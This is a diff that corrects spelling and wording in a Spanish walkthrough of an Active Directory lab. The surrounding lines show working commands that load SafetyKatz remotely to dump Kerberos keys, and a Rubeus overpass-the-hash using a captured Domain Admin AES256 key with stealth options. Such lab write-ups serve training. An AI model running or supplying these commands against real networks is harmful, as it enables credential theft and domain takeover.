@@ -129,17 +129,17 @@ Para poder ejecutar ahora *SafetyKatz* en *dcorp-mgmt*, lo descargamos y ejecuta
 $null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
 ```
 
-Dándonos como respuesta las credenciales del *svcadmin* que es Domain Admin ademas de ser una cuenta de servicio lo cual es muy interesa
+Dándonos como respuesta las credenciales del *svcadmin* que es Domain Admin además de ser una cuenta de servicio lo cual es muy interesante para nosotros aportándonos las claves *AES256*
 
 A continuación usaremos la técnica de *OverPass-The_Hash* para obtener las credenciales de *svcadmin* 
-Tendremos que ejecutar una terminal como Administrador
+Tendremos que ejecutar una terminal aparte como Administrador
 ```shell
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 
  Este comando lo que hace es a través del *Loader* que tenemos ejecutado en la maquina victima ejecutar *Rubeus* solicitando un *TGT* con un usuario en este caso *svcadmin* y una clave *AES256* con los parámetros */ptt* indicamos que queremos hacer un *Pass-The-Ticket* insertando el *TGT* directamente en la sesión actual, con el parámetro */createonly* crea un proceso *cmd* con credenciales de red aisladas, con */show* muestra la ventana del proceso creado y con */opsec* intenta ser lo mas sigiloso posible
 
-Con *winrs* podremos ejecutar comando en la maquina victima y ver que somos el usuario *svcadmin*
+Con *winrs* podremos ejecutar comando en la maquina victima en donde se nos a otorgado la nueva shell y ver que somos el usuario *svcadmin*
 ```shell
 winrs -r:dcorp-dc cmd /c set username
 ```
